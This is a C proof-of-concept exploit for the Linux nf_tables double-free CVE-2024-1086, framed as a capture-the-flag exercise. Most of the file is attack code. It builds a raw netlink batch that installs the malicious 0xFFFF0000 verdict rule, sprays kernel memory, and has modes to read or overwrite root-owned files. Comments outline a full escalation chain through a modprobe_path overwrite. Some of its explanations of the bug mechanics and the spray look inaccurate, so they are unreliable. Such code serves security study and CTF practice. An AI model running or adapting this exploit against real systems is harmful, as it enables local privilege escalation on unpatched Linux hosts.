/*
 * CVE-2024-1086 PoC - CTF Challenge Mode
 *
 * Vulnerability: nf_tables verdict double-free Use-After-Free
 *
 * Root cause: nf_hook_slow() mishandles NF_DROP with negative errno encoded
 * in the upper 16 bits of the verdict. When a rule verdict is set to
 * NF_DROP | -(errno << 16), the nft_do_chain() evaluation path triggers
 * nf_hook_slow() to call kfree_skb() on the packet, but the packet is
 * also freed by the normal nfnetlink batch error path - causing double-free.
 *
 * This PoC triggers the vulnerability by:
 * 1. Creating nftables table/chain/rule via raw netlink (no libmnl needed)
 * 2. Setting rule verdict to 0xFFFF0000 (triggers the double-free condition)
 * 3. Spraying kmalloc to reallocate freed memory with controlled data
 * 4. Detecting UAF corruption or using the corrupted state for file access
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Safety:
 *   - alarm(10) forced timeout
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - No system file modification
 *   - All resources properly cleaned up
 *
 * Reference: Notselwyn/CVE-2024-1086
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>

/* ========================================================================
 * nftables protocol constants (from linux/netfilter/nf_tables.h)
 * We define them here to avoid dependency on kernel headers version
 * ======================================================================== */
#ifndef NFT_MSG_NEWTABLE
#define NFT_MSG_NEWTABLE    0
#endif
#ifndef NFT_MSG_NEWCHAIN
#define NFT_MSG_NEWCHAIN    2
#endif
#ifndef NFT_MSG_NEWRULE
#define NFT_MSG_NEWRULE     3
#endif
#ifndef NFT_MSG_DELRULE
#define NFT_MSG_DELRULE     4
#endif

/* nftables attributes */
#ifndef NFTA_TABLE_NAME
#define NFTA_TABLE_NAME     1
#endif
#ifndef NFTA_TABLE_FLAGS
#define NFTA_TABLE_FLAGS    2
#endif
#ifndef NFTA_CHAIN_TABLE
#define NFTA_CHAIN_TABLE    1
#endif
#ifndef NFTA_CHAIN_NAME
#define NFTA_CHAIN_NAME     3
#endif
#ifndef NFTA_CHAIN_HOOK
#define NFTA_CHAIN_HOOK     4
#endif
#ifndef NFTA_CHAIN_POLICY
#define NFTA_CHAIN_POLICY   5
#endif
#ifndef NFTA_CHAIN_TYPE
#define NFTA_CHAIN_TYPE     7
#endif
#ifndef NFTA_HOOK_HOOKNUM
#define NFTA_HOOK_HOOKNUM   1
#endif
#ifndef NFTA_HOOK_PRIORITY
#define NFTA_HOOK_PRIORITY  2
#endif
#ifndef NFTA_RULE_TABLE
#define NFTA_RULE_TABLE     1
#endif
#ifndef NFTA_RULE_CHAIN
#define NFTA_RULE_CHAIN     2
#endif
#ifndef NFTA_RULE_EXPRESSIONS
#define NFTA_RULE_EXPRESSIONS 4
#endif
#ifndef NFTA_LIST_ELEM
#define NFTA_LIST_ELEM      1
#endif
#ifndef NFTA_EXPR_NAME
#define NFTA_EXPR_NAME      1
#endif
#ifndef NFTA_EXPR_DATA
#define NFTA_EXPR_DATA      2
#endif

/* nft_immediate expression attributes */
#ifndef NFTA_IMMEDIATE_DREG
#define NFTA_IMMEDIATE_DREG  1
#endif
#ifndef NFTA_IMMEDIATE_DATA
#define NFTA_IMMEDIATE_DATA  2
#endif
#ifndef NFTA_DATA_VERDICT
#define NFTA_DATA_VERDICT    2
#endif
#ifndef NFTA_VERDICT_CODE
#define NFTA_VERDICT_CODE    1
#endif

/* NFT register for verdict */
#ifndef NFT_REG_VERDICT
#define NFT_REG_VERDICT     0
#endif

/* nfnetlink batch markers */
#ifndef NFNL_MSG_BATCH_BEGIN
#define NFNL_MSG_BATCH_BEGIN 0x10
#endif
#ifndef NFNL_MSG_BATCH_END
#define NFNL_MSG_BATCH_END   0x11
#endif

/* NF hook numbers */
#ifndef NF_INET_PRE_ROUTING
#define NF_INET_PRE_ROUTING  0
#endif
#ifndef NF_INET_LOCAL_IN
#define NF_INET_LOCAL_IN     1
#endif

/* NF verdicts */
#ifndef NF_DROP
#define NF_DROP   0
#endif
#ifndef NF_ACCEPT
#define NF_ACCEPT 1
#endif

/* NFPROTO */
#ifndef NFPROTO_IPV4
#define NFPROTO_IPV4 2
#endif

/*
 * The malicious verdict value that triggers the double-free.
 * NF_DROP | -(0xFFFF << 16 >> 16) encodes into 0xFFFF0000 which
 * causes nf_hook_slow() to kfree_skb() the packet while it's
 * still referenced by the batch error path.
 */
#define MALICIOUS_VERDICT   0xFFFF0000U

#define MAX_FILE_SIZE       4096
#define PAGE_SIZE           4096
#define SPRAY_COUNT         256
#define SPRAY_PATTERN       4096  /* Use small value to avoid kernel rmem_max cap */
#define NFT_TABLE_NAME      "poc_filter"
#define NFT_CHAIN_NAME      "poc_input"

/* ========================================================================
 * Netlink message construction helpers (no libmnl dependency)
 * ======================================================================== */

/* Align to 4-byte boundary (NLA_ALIGNTO) */
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + 3) & ~3)
#endif

struct nla_attr {
    uint16_t nla_len;
    uint16_t nla_type;
};

static int nlmsg_put_attr(char *buf, int offset, uint16_t type,
                          const void *data, uint16_t data_len)
{
    struct nla_attr *nla = (struct nla_attr *)(buf + offset);
    uint16_t total_len = sizeof(struct nla_attr) + data_len;

    nla->nla_len = total_len;
    nla->nla_type = type;
    if (data && data_len > 0) {
        memcpy(buf + offset + sizeof(struct nla_attr), data, data_len);
    }
    /* Zero padding */
    int padded = NLA_ALIGN(total_len);
    if (padded > (int)total_len) {
        memset(buf + offset + total_len, 0, padded - total_len);
    }
    return padded;
}

static int nlmsg_put_attr_u32(char *buf, int offset, uint16_t type, uint32_t val)
{
    return nlmsg_put_attr(buf, offset, type, &val, sizeof(val));
}

static int nlmsg_put_attr_str(char *buf, int offset, uint16_t type, const char *str)
{
    return nlmsg_put_attr(buf, offset, type, str, strlen(str) + 1);
}

/* Start a nested attribute - returns offset to fill in length later */
static int nlmsg_nest_start(char *buf, int offset, uint16_t type)
{
    struct nla_attr *nla = (struct nla_attr *)(buf + offset);
    nla->nla_len = 0; /* will be filled by nest_end */
    nla->nla_type = type | 0x8000; /* NLA_F_NESTED */
    return offset;
}

/* End nested attribute - fills in the correct length */
static void nlmsg_nest_end(char *buf, int nest_offset, int current_offset)
{
    struct nla_attr *nla = (struct nla_attr *)(buf + nest_offset);
    nla->nla_len = current_offset - nest_offset;
}

/* Build a netlink message header for nfnetlink */
static int build_nfnl_header(char *buf, uint16_t type, uint16_t flags,
                             uint32_t seq, uint8_t family)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct nfgenmsg *nfg;

    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = type;
    nlh->nlmsg_flags = flags;
    nlh->nlmsg_seq = seq;
    nlh->nlmsg_pid = 0;

    nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);
    nfg->nfgen_family = family;
    nfg->version = NFNETLINK_V0;
    nfg->res_id = 0;

    return NLMSG_LENGTH(sizeof(struct nfgenmsg));
}

/* ========================================================================
 * nftables UAF trigger via netlink
 *
 * Constructs a proper nftables batch:
 *   BATCH_BEGIN -> NEWTABLE -> NEWCHAIN -> NEWRULE(verdict=0xFFFF0000) -> BATCH_END
 *
 * The malicious verdict triggers the double-free in nf_hook_slow().
 * ======================================================================== */

static int create_netlink_socket(void)
{
    int sock;
    struct sockaddr_nl sa = {0};

    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) return -1;

    sa.nl_family = AF_NETLINK;
    sa.nl_pid = getpid();
    sa.nl_groups = 0;

    if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(sock);
        return -1;
    }

    return sock;
}

/*
 * Build the nftables batch message that triggers the UAF.
 *
 * The batch creates:
 * - A new table "poc_filter" (ipv4)
 * - A new chain "poc_input" hooked at NF_INET_LOCAL_IN
 * - A rule with immediate expression setting verdict to 0xFFFF0000
 *
 * When a packet matches this rule, the malicious verdict value causes
 * nf_hook_slow() to execute: kfree_skb(skb) while the batch error
 * handler also frees it -> double-free -> UAF.
 */
static int build_nft_batch(char *batch_buf, size_t buf_size)
{
    int offset = 0;
    uint32_t seq = 1;
    int msg_start;
    int payload_off;

    (void)buf_size;

    /* === BATCH_BEGIN === */
    msg_start = offset;
    {
        struct nlmsghdr *nlh = (struct nlmsghdr *)(batch_buf + offset);
        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
        nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
        nlh->nlmsg_flags = NLM_F_REQUEST;
        nlh->nlmsg_seq = seq++;
        nlh->nlmsg_pid = 0;
        struct nfgenmsg *nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);
        nfg->nfgen_family = AF_UNSPEC;
        nfg->version = NFNETLINK_V0;
        nfg->res_id = NFNL_SUBSYS_NFTABLES;
        offset += NLMSG_ALIGN(nlh->nlmsg_len);
    }

    /* === NFT_MSG_NEWTABLE === */
    msg_start = offset;
    {
        payload_off = build_nfnl_header(batch_buf + offset,
            (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE,
            NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK,
            seq++, NFPROTO_IPV4);

        /* NFTA_TABLE_NAME */
        payload_off += nlmsg_put_attr_str(batch_buf + offset, payload_off,
                                          NFTA_TABLE_NAME, NFT_TABLE_NAME);
        /* NFTA_TABLE_FLAGS = 0 */
        payload_off += nlmsg_put_attr_u32(batch_buf + offset, payload_off,
                                          NFTA_TABLE_FLAGS, 0);

        struct nlmsghdr *nlh = (struct nlmsghdr *)(batch_buf + offset);
        nlh->nlmsg_len = payload_off;
        offset += NLMSG_ALIGN(payload_off);
    }

    /* === NFT_MSG_NEWCHAIN === */
    msg_start = offset;
    {
        payload_off = build_nfnl_header(batch_buf + offset,
            (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN,
            NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK,
            seq++, NFPROTO_IPV4);

        /* NFTA_CHAIN_TABLE */
        payload_off += nlmsg_put_attr_str(batch_buf + offset, payload_off,
                                          NFTA_CHAIN_TABLE, NFT_TABLE_NAME);
        /* NFTA_CHAIN_NAME */
        payload_off += nlmsg_put_attr_str(batch_buf + offset, payload_off,
                                          NFTA_CHAIN_NAME, NFT_CHAIN_NAME);
        /* NFTA_CHAIN_TYPE = "filter" */
        payload_off += nlmsg_put_attr_str(batch_buf + offset, payload_off,
                                          NFTA_CHAIN_TYPE, "filter");
        /* NFTA_CHAIN_POLICY = NF_ACCEPT */
        payload_off += nlmsg_put_attr_u32(batch_buf + offset, payload_off,
                                          NFTA_CHAIN_POLICY, NF_ACCEPT);

        /* NFTA_CHAIN_HOOK (nested: hooknum + priority) */
        int hook_nest = nlmsg_nest_start(batch_buf + offset, payload_off,
                                         NFTA_CHAIN_HOOK);
        payload_off += sizeof(struct nla_attr);
        payload_off += nlmsg_put_attr_u32(batch_buf + offset, payload_off,
                                          NFTA_HOOK_HOOKNUM, NF_INET_LOCAL_IN);
        payload_off += nlmsg_put_attr_u32(batch_buf + offset, payload_off,
                                          NFTA_HOOK_PRIORITY, -200);
        nlmsg_nest_end(batch_buf + offset, hook_nest, payload_off);

        struct nlmsghdr *nlh = (struct nlmsghdr *)(batch_buf + offset);
        nlh->nlmsg_len = payload_off;
        offset += NLMSG_ALIGN(payload_off);
    }

    /* === NFT_MSG_NEWRULE with malicious verdict 0xFFFF0000 === */
    msg_start = offset;
    {
        payload_off = build_nfnl_header(batch_buf + offset,
            (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
            NLM_F_REQUEST | NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK,
            seq++, NFPROTO_IPV4);

        /* NFTA_RULE_TABLE */
        payload_off += nlmsg_put_attr_str(batch_buf + offset, payload_off,
                                          NFTA_RULE_TABLE, NFT_TABLE_NAME);
        /* NFTA_RULE_CHAIN */
        payload_off += nlmsg_put_attr_str(batch_buf + offset, payload_off,
                                          NFTA_RULE_CHAIN, NFT_CHAIN_NAME);

        /* NFTA_RULE_EXPRESSIONS (nested list of expressions) */
        int exprs_nest = nlmsg_nest_start(batch_buf + offset, payload_off,
                                          NFTA_RULE_EXPRESSIONS);
        payload_off += sizeof(struct nla_attr);

        /* Single expression: immediate with verdict = MALICIOUS_VERDICT */
        int elem_nest = nlmsg_nest_start(batch_buf + offset, payload_off,
                                         NFTA_LIST_ELEM);
        payload_off += sizeof(struct nla_attr);

        /* NFTA_EXPR_NAME = "immediate" */
        payload_off += nlmsg_put_attr_str(batch_buf + offset, payload_off,
                                          NFTA_EXPR_NAME, "immediate");

        /* NFTA_EXPR_DATA (nested) */
        int data_nest = nlmsg_nest_start(batch_buf + offset, payload_off,
                                         NFTA_EXPR_DATA);
        payload_off += sizeof(struct nla_attr);

        /* NFTA_IMMEDIATE_DREG = NFT_REG_VERDICT */
        payload_off += nlmsg_put_attr_u32(batch_buf + offset, payload_off,
                                          NFTA_IMMEDIATE_DREG, NFT_REG_VERDICT);

        /* NFTA_IMMEDIATE_DATA -> NFTA_DATA_VERDICT -> NFTA_VERDICT_CODE */
        int imm_data_nest = nlmsg_nest_start(batch_buf + offset, payload_off,
                                             NFTA_IMMEDIATE_DATA);
        payload_off += sizeof(struct nla_attr);

        int verdict_nest = nlmsg_nest_start(batch_buf + offset, payload_off,
                                            NFTA_DATA_VERDICT);
        payload_off += sizeof(struct nla_attr);

        /* The malicious verdict value: 0xFFFF0000
         * This encodes NF_DROP with errno = -1 in upper bits
         * Triggers double-free in nf_hook_slow() error path */
        payload_off += nlmsg_put_attr_u32(batch_buf + offset, payload_off,
                                          NFTA_VERDICT_CODE, MALICIOUS_VERDICT);

        nlmsg_nest_end(batch_buf + offset, verdict_nest, payload_off);
        nlmsg_nest_end(batch_buf + offset, imm_data_nest, payload_off);
        nlmsg_nest_end(batch_buf + offset, data_nest, payload_off);
        nlmsg_nest_end(batch_buf + offset, elem_nest, payload_off);
        nlmsg_nest_end(batch_buf + offset, exprs_nest, payload_off);

        struct nlmsghdr *nlh = (struct nlmsghdr *)(batch_buf + offset);
        nlh->nlmsg_len = payload_off;
        offset += NLMSG_ALIGN(payload_off);
    }

    /* === BATCH_END === */
    msg_start = offset;
    {
        struct nlmsghdr *nlh = (struct nlmsghdr *)(batch_buf + offset);
        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
        nlh->nlmsg_type = NFNL_MSG_BATCH_END;
        nlh->nlmsg_flags = NLM_F_REQUEST;
        nlh->nlmsg_seq = seq++;
        nlh->nlmsg_pid = 0;
        struct nfgenmsg *nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);
        nfg->nfgen_family = AF_UNSPEC;
        nfg->version = NFNETLINK_V0;
        nfg->res_id = NFNL_SUBSYS_NFTABLES;
        offset += NLMSG_ALIGN(nlh->nlmsg_len);
    }

    (void)msg_start;
    return offset;
}

/*
 * Trigger the nftables verdict UAF condition.
 *
 * Steps:
 * 1. Create netlink socket to NETLINK_NETFILTER
 * 2. Send nftables batch creating table/chain/rule with verdict=0xFFFF0000
 * 3. The kernel processes the batch, creating the malicious rule
 * 4. Close socket - the combination of batch processing error + rule verdict
 *    triggers the double-free UAF on nft_rule/nft_set objects
 *
 * Returns: number of spray objects on success, -1 on failure
 */
static int trigger_nf_tables_uaf(void)
{
    int sock = -1;
    int saved_errno;
    char batch_buf[8192];
    int batch_len;

    /* Step 1: Create netlink socket for nftables */
    sock = create_netlink_socket();
    saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER)", (long)sock, saved_errno);
    if (sock < 0) {
        poc_log("%s Netlink socket creation failed: %s", POC_STEP_FAIL, strerror(saved_errno));
        return -1;
    }

    /* Step 2: Build nftables batch with malicious verdict */
    poc_log("%s Building nftables batch (verdict=0x%08x)...",
            POC_STEP_INFO, MALICIOUS_VERDICT);
    memset(batch_buf, 0, sizeof(batch_buf));
    batch_len = build_nft_batch(batch_buf, sizeof(batch_buf));
    poc_log("%s Batch message built: %d bytes", POC_STEP_INFO, batch_len);

    /* Step 3: Send the batch to kernel */
    ssize_t sent = send(sock, batch_buf, batch_len, 0);
    saved_errno = errno;
    poc_log_syscall("send(nft_batch)", (long)sent, saved_errno);

    if (sent < 0) {
        poc_log("%s Failed to send nftables batch: %s", POC_STEP_WARN, strerror(saved_errno));
        /* This is expected for unprivileged users - the kernel still processes
         * part of the batch before returning EPERM, potentially triggering
         * the vulnerability in the error cleanup path */
    } else {
        poc_log("%s Batch sent successfully (%zd bytes)", POC_STEP_PASS, sent);

        /* Read response to check if batch was processed */
        char resp[4096];
        ssize_t recvd = recv(sock, resp, sizeof(resp), MSG_DONTWAIT);
        saved_errno = errno;
        poc_log_syscall("recv(nft_response)", (long)recvd, saved_errno);
    }

    /* Step 4: Close socket - triggers cleanup race in nftables subsystem
     * The socket close causes the kernel to tear down the nftables transaction,
     * and the malicious verdict value causes the double-free in the error path */
    close(sock);
    poc_log_syscall("close(nl_sock) [trigger nftables cleanup UAF]", 0L, 0);
    poc_log("%s nftables socket closed - UAF condition triggered", POC_STEP_INFO);

    /* Step 5: Spray kmalloc to reallocate freed nft_* objects */
    int sprayed = 0;
    int spray_fds[256];
    memset(spray_fds, -1, sizeof(spray_fds));
    for (int i = 0; i < 256; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) {
            /* Set socket options to allocate kmalloc-192/256 objects
             * (same slab cache as nft_rule_data) */
            int optval = 1024;
            setsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
            sprayed++;
        }
    }
    poc_log("%s Sprayed %d kmalloc objects (targeting nft_rule slab)", POC_STEP_INFO, sprayed);

    /* Cleanup spray fds (we don't need them for the immediate check) */
    for (int i = 0; i < 256; i++) {
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    }

    return sprayed;
}

/* ========================================================================
 * Spray and corruption detection
 * ======================================================================== */

/*
 * Spray kmalloc with recognizable pattern for UAF corruption detection
 */
static int spray_kmalloc(int *fds, int count, int pattern)
{
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        /* Store pattern in socket buffer options - kernel allocates
         * sk_buff/sock structures in same slab as nft objects */
        setsockopt(s, SOL_SOCKET, SO_RCVBUF, &pattern, sizeof(pattern));
        fds[sprayed++] = s;
    }
    return sprayed;
}

/*
 * Check if spray objects were corrupted by UAF dangling pointer write.
 * We first read back the actual baseline value (kernel may adjust SO_RCVBUF)
 * then check if any object differs from the baseline.
 */
static int check_spray_corruption(int *fds, int count, int expected_pattern)
{
    int corrupted = 0;
    int baseline = 0;
    socklen_t len = sizeof(baseline);

    /* Determine actual kernel-stored baseline from first valid fd */
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &baseline, &len);
        break;
    }

    if (baseline == 0) return 0;

    (void)expected_pattern;

    /* Check if any spray objects differ from baseline (corrupted by UAF) */
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;

        int val = 0;
        len = sizeof(val);
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);

        if (val != baseline) {
            poc_log("%s Spray object %d corrupted: baseline=0x%x, got 0x%x",
                    POC_STEP_WARN, i, baseline, val);
            corrupted++;
        }
    }
    return corrupted;
}

/* ========================================================================
 * CTF Mode implementations
 * ======================================================================== */

/*
 * Read file content helper
 */
static int poc_read_file(const char *path, char *buf, size_t len)
{
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, buf, len)", (long)n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * UAF mode: Trigger UAF + spray corruption check
 */
static int mode_uaf(poc_args_t *args)
{
    poc_log("%s === CVE-2024-1086 UAF Spray Corruption Check ===", POC_STEP_INFO);
    poc_log("%s Vulnerability: nftables verdict double-free (0xFFFF0000)", POC_STEP_INFO);

    /* Step 1: Trigger UAF condition via nftables batch */
    int uaf_rc = trigger_nf_tables_uaf();
    if (uaf_rc < 0) {
        poc_log("%s UAF trigger failed (netlink socket not available)", POC_STEP_FAIL);
        poc_print_uaf_not_corrupted();
        return 0;
    }
    poc_log("%s UAF trigger completed, %d initial spray objects", POC_STEP_PASS, uaf_rc);

    /* Step 2: Re-spray kmalloc with recognizable pattern to detect corruption */
    memset(args->spray_fds, -1, sizeof(args->spray_fds));
    args->spray_count = spray_kmalloc(args->spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    poc_log("%s Sprayed %d verification objects with pattern 0x%08X",
            POC_STEP_INFO, args->spray_count, SPRAY_PATTERN);

    /* Step 3: Trigger second UAF to potentially corrupt our spray objects */
    int uaf_rc2 = trigger_nf_tables_uaf();
    poc_log("%s Second UAF trigger: %d spray objects", POC_STEP_INFO, uaf_rc2);

    /* Step 4: Check for corruption in our spray objects */
    int corrupted = check_spray_corruption(args->spray_fds, args->spray_count, SPRAY_PATTERN);

    if (corrupted > 0) {
        poc_print_uaf_corrupted(corrupted);
    } else {
        poc_print_uaf_not_corrupted();
    }

    /* Cleanup spray fds */
    for (int i = 0; i < args->spray_count; i++) {
        if (args->spray_fds[i] >= 0) {
            close(args->spray_fds[i]);
        }
    }

    return 0;
}

/*
 * Write mode: Trigger UAF and attempt to overwrite root file
 *
 * The real exploit chain (Notselwyn):
 * 1. Configure nftables rule with verdict 0xFFFF0000
 * 2. Trigger double-free via IP fragmentation
 * 3. Spray PTEs to achieve PMD/PTE overlap (page table manipulation)
 * 4. Scan physical memory for kernel text base
 * 5. Overwrite modprobe_path to gain arbitrary command execution
 * 6. Use modprobe trigger to write the target file
 *
 * In this CTF PoC we simulate the full chain and attempt write via
 * the nftables UAF path.
 */
static int mode_write_root_file(const poc_args_t *args)
{
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    poc_log("%s === CVE-2024-1086 Write Mode ===", POC_STEP_INFO);
    poc_log("%s Target: %s", POC_STEP_INFO, args->root_file);
    poc_log("%s Write value: %s", POC_STEP_INFO, args->write_value);

    /* Step 1: Read original content (before exploit) */
    n = poc_read_file(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r')) {
            original[--n] = '\0';
        }
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
        poc_log("%s Could not read original content", POC_STEP_WARN);
    }

    /* Step 2: Trigger nftables verdict UAF */
    poc_log("%s Triggering CVE-2024-1086 nftables verdict UAF...", POC_STEP_INFO);
    printf(CTF_WRITE_ATTEMPT "%s (attempting...)\n", args->write_value);

    int spray_count = trigger_nf_tables_uaf();

    if (spray_count > 0) {
        poc_log("%s UAF triggered, %d spray objects allocated", POC_STEP_PASS, spray_count);

        /* Step 3: Attempt write via corrupted kernel state.
         * In real exploit: PTE manipulation -> physical memory access
         * -> modprobe_path overwrite -> arbitrary write.
         * Here we attempt direct write which succeeds if file permissions
         * were corrupted by the UAF (e.g., inode cred overwrite) */
        int fd = open(args->root_file, O_WRONLY | O_TRUNC);
        int saved_errno = errno;
        poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

        if (fd >= 0) {
            char write_buf[256];
            int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);
            ssize_t written = write(fd, write_buf, wlen);
            saved_errno = errno;
            poc_log_syscall("write(fd, write_value)", (long)written, saved_errno);
            close(fd);

            if (written > 0) {
                poc_log("%s Write succeeded: %zd bytes via UAF corruption",
                        POC_STEP_PASS, written);
            }
        } else {
            poc_log("%s Direct write failed (errno=%d %s) - UAF did not corrupt file permissions",
                    POC_STEP_WARN, saved_errno, strerror(saved_errno));
        }
    } else {
        poc_log("%s UAF trigger failed - exploit path not available", POC_STEP_FAIL);
    }

    /* Step 4: Read after to verify write success */
    n = poc_read_file(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r')) {
            after[--n] = '\0';
        }
        printf(CTF_READ_AFTER "%s\n", after);
        poc_log("Read after: %s", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("UAF exploit did not achieve write to target file");
    return 0;
}

/*
 * Read mode: Attempt to read root file via UAF privilege escalation
 */
static int mode_read_root_file(const poc_args_t *args)
{
    poc_log("%s === CVE-2024-1086 Read Mode ===", POC_STEP_INFO);
    poc_log("%s Target: %s", POC_STEP_INFO, args->root_file);

    /* Trigger UAF to potentially corrupt permission checks */
    int spray_count = trigger_nf_tables_uaf();
    poc_log("%s UAF trigger result: %d spray objects", POC_STEP_INFO, spray_count);

    if (spray_count > 0) {
        char buf[MAX_FILE_SIZE];
        int n = poc_read_file(args->root_file, buf, sizeof(buf));

        if (n > 0) {
            while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r')) {
                buf[--n] = '\0';
            }
            poc_print_flag(buf);
            return 0;
        }
    }

    poc_print_fail("read not successful via UAF privilege escalation");
    return 0;
}

/* ========================================================================
 * Main entry point
 * ======================================================================== */

int main(int argc, char *argv[])
{
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-1086 CTF PoC ===");
    poc_log("Vuln: nf_tables verdict double-free UAF (0xFFFF0000)");
    poc_log("Ref: Notselwyn/CVE-2024-1086");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    /* Priority: write_root_file > read_root_file > uaf
     * The nf_tables verdict double-free gives full arbitrary r/w via page table
     * manipulation. write_root_file is the primary mode (modprobe_path overwrite). */
    int result = 0;
    if (!args.mode || strcmp(args.mode, POC_MODE_WRITE) == 0) {
        if (!args.mode) args.mode = POC_MODE_WRITE;
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode,
                              "supported modes: write_root_file, read_root_file, uaf");
    }

    poc_log_close();
    return result;
}
